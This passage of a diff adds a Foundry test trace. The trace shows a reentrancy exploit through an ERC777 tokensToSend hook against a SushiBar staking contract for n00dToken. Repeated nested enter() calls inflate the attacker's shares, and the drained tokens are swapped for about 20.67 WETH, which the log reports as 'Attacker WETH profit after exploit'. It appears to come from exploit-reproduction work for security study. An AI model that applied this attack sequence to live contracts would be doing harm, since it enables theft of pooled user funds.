+    │   │   ├─ [100103] SushiBar::enter(5609275938288706272789 [5.609e21])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 158686275849663400539 [1.586e20]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 280902648245724001380111 [2.809e23])
+    │   │   │   ├─ [72188] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5609275938288706272789 [5.609e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   ├─ [60844] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5609275938288706272789 [5.609e21], 0x, 0x)
+    │   │   │   │   │   ├─ [37972] SushiBar::enter(5609275938288706272789 [5.609e21])
+    │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 158686275849663400539 [1.586e20]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10210308687738824511010991 [1.021e25])
+    │   │   │   │   │   │   ├─ [32757] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5609275938288706272789 [5.609e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   ├─ [21413] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5609275938288706272789 [5.609e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   ├─ [18441] SushiBar::enter(5609275938288706272789 [5.609e21])
+    │   │   │   │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 158686275849663400539 [1.586e20]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 371126453061133975323878672 [3.711e26])
+    │   │   │   │   │   │   │   │   │   ├─ [13226] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5609275938288706272789 [5.609e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1882] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 5609275938288706272789 [5.609e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 5609275938288706272789 [5.609e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 5609275938288706272789 [5.609e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000000089a36e7211cd5ca5b → 0x000000000000000000000000000000000000000000000138ae8e41c9091e0870
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000005f065b4c5479d69366c → 0x0000000000000000000000000000000000000000000004c0515d6a9fb120f857
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000008ad99b4c48a07ee65dfbe → 0x0000000000000000000000000000000000000000013baaaf0a378ab9dafd04ce
+    │   │   │   │   │   │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000008af487fc8f3f658052bb4 → 0x0000000000000000000000000000000000000000013bac5dd53bf4a8449c50c4
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 37: 1 → 2
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 5609275938288706272789 [5.609e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 5609275938288706272789 [5.609e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000138ae8e41c9091e0870 → 0x000000000000000000000000000000000000000000000268c2e59c70f5664685
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000004c0515d6a9fb120f857 → 0x0000000000000000000000000000000000000000000003903d060ff7c4d8ba42
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000003b7bc358d578739ca70f → 0x00000000000000000000000000000000000000000008ad99b4c48a07ee65dfbe
+    │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000003d2a8e5d3f66dd3bf305 → 0x00000000000000000000000000000000000000000008af487fc8f3f658052bb4
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 37: 0 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 5609275938288706272789 [5.609e21], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 5609275938288706272789 [5.609e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000003903d060ff7c4d8ba42 → 0x00000000000000000000000000000000000000000000026028aeb54fd8907c2d
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000268c2e59c70f5664685 → 0x000000000000000000000000000000000000000000000398d73cf718e1ae849a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6 → 0x000000000000000000000000000000000000000000003d2a8e5d3f66dd3bf305
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000003b7bc358d578739ca70f
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [490] SushiBar::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 381617664397118523836269774 [3.816e26]
+    │   │   ├─ [15468] SushiBar::leave(381617664397118523836269774 [3.816e26])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 16986514090715782218906 [1.698e22]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 381617664397118523836269774 [3.816e26])
+    │   │   │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16986160374355412610596 [1.698e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 16986160374355412610596 [1.698e22], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 16986160374355412610596 [1.698e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000026028aeb54fd8907c2d → 0x0000000000000000000000000000000000000000000005f8fb030540df2bea51
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000398d73cf718e1ae849a → 0x00000000000000000000000000000000000000000000000004e8a727db131676
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000013baaaf0a378ab9dafd04ce → 0
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000013bac5dd53bf4a8449c50c4 → 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [12740] n00dToken::transfer(0x5476DB8B72337d44A6724277083b1a927c82a389, 20456276655119521934738 [2.045e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   ├─ [1771] ContractTest::tokensToSend(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5476DB8B72337d44A6724277083b1a927c82a389, 20456276655119521934738 [2.045e22], 0x, 0x)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, amount: 20456276655119521934738 [2.045e22], data: 0x, operatorData: 0x)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, value: 20456276655119521934738 [2.045e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x000000000000000000000000000000000000000000000454fdbe9a88c269ed92
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000005f8fb030540df2bea51 → 0x0000000000000000000000000000000000000000000001a40b25216bc425fcbf
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 38: 0x0000000000000000000000000000000000000000000001227d0b47a31215a362 → 0x00000000000000000000000000000000000000000000013014575aa7ec483e15
+    │   │   │   @ 37: 2 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [645] n00dToken::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 20457276655119521934738 [2.045e22]
+    │   ├─ [534] WETH9::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 75400440702963015319 [7.54e19]
+    │   ├─ emit Sync(reserve0: 20457276655119521934738 [2.045e22], reserve1: 75400440702963015319 [7.54e19])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 20456276655119521934738 [2.045e22], amount1In: 0, amount0Out: 20393907825154163367937 [2.039e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x635812f700000000000416642d54a803de970000000004519c34021ffc7a6001 → 0x635812f700000000000416642d54a803de97000000000454fdbe9a88c269ed92
+    │   └─ ← [Stop]
+    ├─ [645] n00dToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 7748435595813303221439 [7.748e21]
+    ├─ [517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
+    │   └─ ← [Return] 20457276655119521934738 [2.045e22], 75400440702963015319 [7.54e19], 1666716407 [1.666e9]
+    ├─ [12740] n00dToken::transfer(0x5476DB8B72337d44A6724277083b1a927c82a389, 7748435595813303221439 [7.748e21])
+    │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   ├─ [1771] ContractTest::tokensToSend(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5476DB8B72337d44A6724277083b1a927c82a389, 7748435595813303221439 [7.748e21], 0x, 0x)
+    │   │   └─ ← [Stop]
+    │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, amount: 7748435595813303221439 [7.748e21], data: 0x, operatorData: 0x)
+    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, value: 7748435595813303221439 [7.748e21])
+    │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   ├─  storage changes:
+    │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000001a40b25216bc425fcbf → 0
+    │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x000000000000000000000000000000000000000000000454fdbe9a88c269ed92 → 0x0000000000000000000000000000000000000000000005f908e3bbf4868fea51
+    │   └─ ← [Return] true
+    ├─ [41477] 0x5476DB8B72337d44A6724277083b1a927c82a389::swap(0, 20668267027908465821 [2.066e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   ├─ [27962] WETH9::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20668267027908465821 [2.066e19])
+    │   │   ├─ emit Transfer(from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20668267027908465821 [2.066e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xaa76f3f494ab445128ab3d1d50a242d90076d3a74b8f1154d43fa7ec7832ee55: 0x00000000000000000000000000000000000000000000000416642d54a803de97 → 0x000000000000000000000000000000000000000000000002f78fbdf9569cc9fa
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000011ed46f5b5167149d
+    │   │   └─ ← [Return] true
+    │   ├─ [645] n00dToken::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 28205712250932825156177 [2.82e22]
+    │   ├─ [534] WETH9::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 54732173675054549498 [5.473e19]
+    │   ├─ emit Sync(reserve0: 28205712250932825156177 [2.82e22], reserve1: 54732173675054549498 [5.473e19])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 7748435595813303221439 [7.748e21], amount1In: 0, amount0Out: 0, amount1Out: 20668267027908465821 [2.066e19], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x635812f700000000000416642d54a803de97000000000454fdbe9a88c269ed92 → 0x635812f7000000000002f78fbdf9569cc9fa0000000005f908e3bbf4868fea51
+    │   └─ ← [Stop]
+    ├─ [534] WETH9::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 20668267027908465821 [2.066e19]
+    ├─ emit log_named_decimal_uint(key: "Attacker WETH profit after exploit", val: 20668267027908465821 [2.066e19], decimals: 18)
+    ├─  storage changes:
+    │   @ 39: 0 → 0x0000000000000000000000000000000000000000000004519c34021ffc7a6001
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.57s (6.22s CPU time)
+
+Ran 1 test suite in 13.58s (7.57s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
